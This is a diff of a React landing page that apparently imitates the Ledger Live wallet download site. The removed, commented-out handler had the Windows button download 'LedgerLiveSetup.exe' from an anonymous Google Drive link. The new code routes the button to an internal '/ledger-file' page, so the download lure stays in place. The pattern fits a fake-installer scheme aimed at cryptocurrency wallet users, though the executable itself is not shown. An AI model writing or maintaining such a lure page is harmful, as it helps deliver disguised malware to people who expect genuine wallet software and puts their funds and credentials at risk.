@@ -4,23 +4,29 @@ import "swiper/css";
 import "swiper/css/autoplay";
 import { Autoplay } from "swiper/modules";
 import React, { useState } from "react";
+import { useNavigate } from "react-router-dom";
 
 const Home = () => {
   const [activeIndex, setActiveIndex] = useState(0);
+  const navigate = useNavigate();
 
   const imagePaths = Array.from(
     { length: 24 },
     (_, i) => `/assets/${i + 1}.webp`
   );
 
-  const handleDownload = () => {
-    const link = document.createElement("a");
-    link.href =
-      "https://drive.google.com/uc?export=download&id=1JTSy47SnPMyAJUzdeINRqWUczVGhVXvW";
-    link.download = "LedgerLiveSetup.exe";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
+  // const handleDownload = () => {
+  //   const link = document.createElement("a");
+  //   link.href =
+  //     "https://drive.google.com/uc?export=download&id=1JTSy47SnPMyAJUzdeINRqWUczVGhVXvW";
+  //   link.download = "LedgerLiveSetup.exe";
+  //   document.body.appendChild(link);
+  //   link.click();
+  //   document.body.removeChild(link);
+  // };
+
+  const handleNavigate = () => {
+    navigate("/ledger-file");
   };
 
   const faqData = [
@@ -244,7 +250,8 @@ const Home = () => {
           <div className="flex flex-wrap justify-center items-center gap-4">
             {/* Windows Button */}
             <div
-              onClick={handleDownload}
+              // onClick={handleDownload}
+              onClick={handleNavigate}
               className="flex items-center space-x-4 bg-[#2a2a2a] border border-[#444444] rounded-lg px-6 py-3 w-[220px] cursor-pointer hover:bg-[#3a3a3a] transition"
             >
               <svg
